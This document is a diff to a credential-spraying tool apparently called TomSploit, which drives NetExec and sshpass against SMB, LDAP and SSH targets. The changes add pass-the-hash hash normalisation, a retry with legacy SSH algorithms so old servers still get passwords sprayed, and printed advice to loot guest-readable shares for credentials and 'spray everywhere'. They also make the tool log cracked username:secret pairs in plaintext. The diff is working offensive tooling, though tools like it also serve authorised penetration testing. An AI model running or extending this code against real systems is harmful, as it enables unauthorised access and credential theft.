@@ -99,7 +99,7 @@ class Config:
     hashes: list[str]
     kerberos: bool
     protocols: list[str]
-    log_file: str
+    log_file: str | None
     creds_file: str | None
     json_out: str | None
     workers: int
@@ -699,6 +699,14 @@ def build_context(s: Success, ip: str, hostname: str, is_dc: bool) -> dict[str, 
     domain = s.domain or ""
     secret = s.secret or ""
     pth_hash = secret if s.is_hash else ""   # PtH templates only fire for HASH
+    # secretsdump prints hashes as LMHASH:NTHASH. impacket -hashes wants the NT
+    # half (':{nthash}'), so collapse a full pair down to the NT hash; an
+    # NT-only hash passes through unchanged.
+    nt_only = pth_hash
+    if pth_hash and ":" in pth_hash:
+        parts = pth_hash.split(":")
+        if len(parts) == 2 and all(re.fullmatch(r"[0-9a-fA-F]{32}", p) for p in parts):
+            nt_only = parts[1]
 
     if domain:
         url_pw = f"{domain}/{user}:{secret}@{ip}"
@@ -723,7 +731,7 @@ def build_context(s: Success, ip: str, hostname: str, is_dc: bool) -> dict[str, 
         "qpw": q(secret) if not s.is_hash else "''",
         "qdom": q(domain) if domain else "''",
         "qhash": q(pth_hash) if pth_hash else "''",
-        "nthash": q(pth_hash) if pth_hash else "NT",
+        "nthash": q(nt_only) if nt_only else "NT",
         "url_pw": q(url_pw),
         "url_nopw": q(url_nopw),
         "host": q(hostname or ip),
@@ -831,7 +839,8 @@ class Reporter:
         if cfg.paired:
             print(f"  Pairing         {DIM}│{RESET} {BOLD}positional{RESET} "
                   f"{DIM}(user[i] ↔ secret[i], no cross-spray){RESET}")
-        print(f"  Log file        {DIM}│{RESET} {BOLD}{cfg.log_file}{RESET}")
+        if cfg.log_file:
+            print(f"  Log file        {DIM}│{RESET} {BOLD}{cfg.log_file}{RESET}")
         if cfg.creds_file:
             print(f"  Creds output    {DIM}│{RESET} {BOLD}{cfg.creds_file}{RESET}")
         if cfg.kerberos:
@@ -1286,6 +1295,20 @@ class Reporter:
             print(f"    {YELLOW}►{RESET} {BOLD}{s.label:<20}{RESET} "
                   f"{DIM}│{RESET} {s.raw_message}")
         print()
+        # Guest still reads guest-accessible shares — enumerate exactly like a
+        # null session. Skip if the anonymous-SMB block already printed these.
+        if not result.anon_smb:
+            ip = result.real_ip or result.target
+            print(f"  {CYAN}{BOLD}💡 Guest SMB — read what guest can reach{RESET}")
+            print(f"  {'─' * (BANNER_WIDTH - 2)}")
+            for i, (label, tmpl) in enumerate(ANON_SMB_COMMANDS):
+                if i > 0:
+                    print()
+                print(f"        {DIM}# {label}{RESET}")
+                print(f"        {tmpl.format(ip=ip)}")
+            print(f"\n        {DIM}# a readable share with a config/backup is the "
+                  f"usual win — grep it for creds, then reuse them (spray everywhere){RESET}")
+            print()
 
     def _suggestions(self, result: TargetResult) -> None:
         # One block per DISTINCT credential (protocol + auth + scope + user),
@@ -1466,7 +1489,7 @@ class Reporter:
             if self.cfg.json_out:
                 print(f"    {DIM}JSON results:     {RESET}  {self.cfg.json_out}")
             if self.cfg.log_file:
-                print(f"    {DIM}nxc log:          {RESET}  {self.cfg.log_file}")
+                print(f"    {DIM}scan log:         {RESET}  {self.cfg.log_file}")
 
         print(f"\n{'═' * BANNER_WIDTH}\n")
 
@@ -1657,6 +1680,13 @@ class TomSploit:
         self._done = 0
         self._total = 0
 
+        # Consolidated scan log (written once at the end). nxc is no longer
+        # given --log: this nxc opens that path with mode "x" and crashes when
+        # a second invocation reuses the name, so tomsploit captures every
+        # command's output itself and writes a single log instead.
+        self._log_lock = threading.Lock()
+        self._log_buf: list[str] = []
+
     def _build_creds(self) -> list[Cred]:
         cfg = self.cfg
         if cfg.kerberos:
@@ -1737,19 +1767,23 @@ class TomSploit:
 
     # ── subprocess wrapper ─
     def _run_proc(self, cmd: list[str], timeout: float) -> tuple[str, str, bool]:
-        """Run nxc. Returns (stdout, stderr, timed_out)."""
+        """Run nxc/ssh. Returns (stdout, stderr, timed_out). Every invocation's
+        output is appended to the consolidated scan log."""
         if self._stop.is_set():
             raise InterruptedError()
         try:
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, text=True)
         except FileNotFoundError as exc:
-            return "", f"executable not found: {exc.filename}", False
+            err = f"executable not found: {exc.filename}"
+            self._log(cmd, "", err, False)
+            return "", err, False
         with self._procs_lock:
             self._procs.add(proc)
         try:
             try:
                 out, err = proc.communicate(timeout=timeout)
+                self._log(cmd, out or "", err or "", False)
                 return out or "", err or "", False
             except subprocess.TimeoutExpired:
                 proc.kill()
@@ -1757,10 +1791,25 @@ class TomSploit:
                     proc.communicate(timeout=2)
                 except subprocess.TimeoutExpired:
                     pass
+                self._log(cmd, "", "", True)
                 return "", "", True
         finally:
             with self._procs_lock:
                 self._procs.discard(proc)
+
+    def _log(self, cmd: list[str], stdout: str, stderr: str,
+             timed_out: bool) -> None:
+        """Append one command and its output to the in-memory scan log."""
+        rec = ["$ " + " ".join(shlex.quote(c) for c in cmd)]
+        if timed_out:
+            rec.append("  [timed out]")
+        else:
+            if stdout.strip():
+                rec.append(stdout.rstrip())
+            if stderr.strip():
+                rec.append("[stderr] " + stderr.rstrip())
+        with self._log_lock:
+            self._log_buf.append("\n".join(rec))
 
     @staticmethod
     def _stderr_fallback(stdout: str, stderr: str) -> list[str]:
@@ -1782,7 +1831,7 @@ class TomSploit:
             cmd.extend(["-p", cred.secret])
         if local_auth:
             cmd.append("--local-auth")
-        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT), "--log", self.cfg.log_file])
+        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
         return cmd
 
     # ── one (protocol, scope) task ─
@@ -1913,6 +1962,7 @@ class TomSploit:
 
         have_sshpass = shutil.which("sshpass") is not None
         warned_no_sshpass = False
+        legacy_mode = False   # flipped (once) when an old server rejects modern algos
 
         for cred in self.creds:
             if self._stop.is_set():
@@ -1933,7 +1983,7 @@ class TomSploit:
                     warned_no_sshpass = True
                 self._tick(); continue
 
-            cmd = self._ssh_cmd(target, cred.user, cred.secret)
+            cmd = self._ssh_cmd(target, cred.user, cred.secret, legacy=legacy_mode)
             try:
                 stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
             except InterruptedError:
@@ -1945,6 +1995,27 @@ class TomSploit:
                 self._tick(); continue
 
             combined = f"{stdout}\n{stderr}"
+
+            # Old SSH server? The first time negotiation fails, switch this
+            # target to legacy algorithms and retry the same cred — otherwise a
+            # reachable but ancient box gets ZERO passwords tested. The flag
+            # sticks so the rest of the creds reuse legacy mode automatically.
+            if (not legacy_mode and self._SSH_MARKER not in stdout
+                    and self._ssh_is_negotiation_error(combined)):
+                legacy_mode = True
+                self._say(f"  {YELLOW}↻ SSH{RESET} {DIM}algorithm negotiation "
+                          f"failed — retrying with legacy algorithms{RESET}")
+                try:
+                    stdout, stderr, timed_out = self._run_proc(
+                        self._ssh_cmd(target, cred.user, cred.secret, legacy=True),
+                        SUBPROCESS_TIMEOUT)
+                except InterruptedError:
+                    break
+                if timed_out:
+                    lines.append(("[-]", f"{label} — connection timed out"))
+                    self._tick(); continue
+                combined = f"{stdout}\n{stderr}"
+
             if self._SSH_MARKER in stdout:
                 # Genuine shell access.
                 success = Success(
@@ -1971,10 +2042,25 @@ class TomSploit:
             self._tick()
         return lines, successes, target_info
 
+    # Legacy algorithm options, appended on a negotiation-failure retry so an
+    # old SSH server (only offering ssh-rsa host keys / SHA-1 KEX / CBC ciphers,
+    # which modern OpenSSH disables by default) still gets its passwords tested
+    # instead of being written off as "negotiation failed".
+    _SSH_LEGACY_OPTS = [
+        "-o", "HostKeyAlgorithms=+ssh-rsa,ssh-dss",
+        "-o", ("KexAlgorithms=+diffie-hellman-group1-sha1,"
+               "diffie-hellman-group14-sha1,"
+               "diffie-hellman-group-exchange-sha1"),
+        "-o", "Ciphers=+aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc",
+        "-o", "MACs=+hmac-sha1,hmac-md5",
+    ]
+
     @staticmethod
-    def _ssh_cmd(target: str, user: str, secret: str) -> list[str]:
+    def _ssh_cmd(target: str, user: str, secret: str,
+                 legacy: bool = False) -> list[str]:
         """sshpass + ssh, password auth only, non-interactive, runs a marker
-        command so success means a real shell executed it."""
+        command so success means a real shell executed it. legacy=True re-enables
+        the old host-key/KEX/cipher algorithms for ancient servers."""
         marker = TomSploit._SSH_MARKER
         ssh = [
             "ssh",
@@ -1986,9 +2072,13 @@ class TomSploit:
             "-o", "PubkeyAuthentication=no",
             "-o", "NumberOfPasswordPrompts=1",
             "-o", "LogLevel=ERROR",
+        ]
+        if legacy:
+            ssh.extend(TomSploit._SSH_LEGACY_OPTS)
+        ssh.extend([
             f"{user}@{target}",
             f"echo {marker}; id 2>/dev/null",
-        ]
+        ])
         return ["sshpass", "-p", secret, *ssh]
 
     @staticmethod
@@ -2002,6 +2092,14 @@ class TomSploit:
             "port 22: ", "unable to negotiate",
         )
         return any(n in t for n in needles)
+
+    @staticmethod
+    def _ssh_is_negotiation_error(text: str) -> bool:
+        """The retriable subset of connection errors: host-key / KEX / cipher
+        mismatch. Refused / unreachable / unresolved are NOT retriable."""
+        t = text.lower()
+        return any(n in t for n in
+                   ("no matching", "unable to negotiate", "kex_exchange"))
 
     @staticmethod
     def _ssh_conn_reason(text: str) -> str:
@@ -2027,7 +2125,7 @@ class TomSploit:
             return
         target = result.target
         cmd = ["nxc", "smb", target, "-u", "", "-p", "", "--pass-pol",
-               "--timeout", str(NETEXEC_TIMEOUT), "--log", self.cfg.log_file]
+               "--timeout", str(NETEXEC_TIMEOUT)]
         try:
             stdout, _stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
         except InterruptedError:
@@ -2047,7 +2145,7 @@ class TomSploit:
 
     def _scan_anon_smb(self, target: str) -> tuple[list[str], bool]:
         cmd = ["nxc", "smb", target, "-u", "", "-p", "",
-               "--timeout", str(NETEXEC_TIMEOUT), "--log", self.cfg.log_file]
+               "--timeout", str(NETEXEC_TIMEOUT)]
         try:
             stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
         except InterruptedError:
@@ -2076,7 +2174,7 @@ class TomSploit:
         Returns (raw_lines, success, users_list)."""
         cmd = ["nxc", "ldap", target, "-u", "", "-p", "",
                "--query", "(objectClass=*)", "",
-               "--timeout", str(NETEXEC_TIMEOUT), "--log", self.cfg.log_file]
+               "--timeout", str(NETEXEC_TIMEOUT)]
         try:
             stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT * 2)
         except InterruptedError:
@@ -2320,6 +2418,7 @@ class TomSploit:
                 self.reporter.summary(results)
             if self.cfg.json_out:
                 self._write_json(results)
+            self._write_log(results)
             if not self._stop.is_set():
                 self.reporter.next_steps(results)
         return 130 if self._stop.is_set() else 0
@@ -2362,6 +2461,43 @@ class TomSploit:
                 json.dump(payload, f, indent=2)
         except OSError as exc:
             print(f"  {YELLOW}[!] Could not write JSON: {exc}{RESET}")
+
+    def _write_log(self, results: list[TargetResult]) -> None:
+        """Write the consolidated scan log (replaces nxc's per-call --log):
+        the raw output of every command, then a short per-target summary.
+        Only writes when -o/--output gave a path; otherwise nothing is left
+        on disk (nxc still keeps its own logs under ~/.nxc/logs)."""
+        if not self.cfg.log_file:
+            return
+        try:
+            with open(self.cfg.log_file, "w") as f:
+                f.write(f"tomsploit — "
+                        f"{datetime.now().isoformat(timespec='seconds')}\n")
+                f.write(f"targets:   {', '.join(self.cfg.targets)}\n")
+                f.write(f"protocols: {', '.join(self.cfg.protocols)}\n")
+                with self._log_lock:
+                    body = list(self._log_buf)
+                f.write(f"\n{'=' * 60}\n  RAW COMMAND OUTPUT\n{'=' * 60}\n")
+                f.write("\n\n".join(body) if body else "(no commands run)")
+                f.write(f"\n\n{'=' * 60}\n  RESULT SUMMARY\n{'=' * 60}\n")
+                for r in results:
+                    head = r.target
+                    if r.hostname or r.domain:
+                        head += (f"  (host:{r.hostname or '?'} "
+                                 f"domain:{r.domain or '?'})")
+                    f.write(f"\n{head}\n")
+                    if not r.scanned:
+                        f.write(f"  skipped: {r.skipped_reason}\n")
+                        continue
+                    if r.successes:
+                        for s in r.successes:
+                            adm = " (admin)" if s.is_admin else ""
+                            f.write(f"  [+] {s.protocol} {s.scope}  "
+                                    f"{s.user}:{s.secret}{adm}\n")
+                    else:
+                        f.write("  no valid credentials\n")
+        except OSError as exc:
+            print(f"  {YELLOW}[!] Could not write log file: {exc}{RESET}")
 
 
 # ─── CLI ───────────────────────────────────────────────────────────────
@@ -2535,7 +2671,7 @@ def build_config(args: argparse.Namespace) -> Config:
     if not protocols:
         raise ValueError("No protocols selected.")
 
-    log_file = args.output or (datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt")
+    log_file = args.output            # only write a log when -o/--output is given
 
     return Config(
         targets=targets, users=users, passwords=passwords, hashes=hashes,
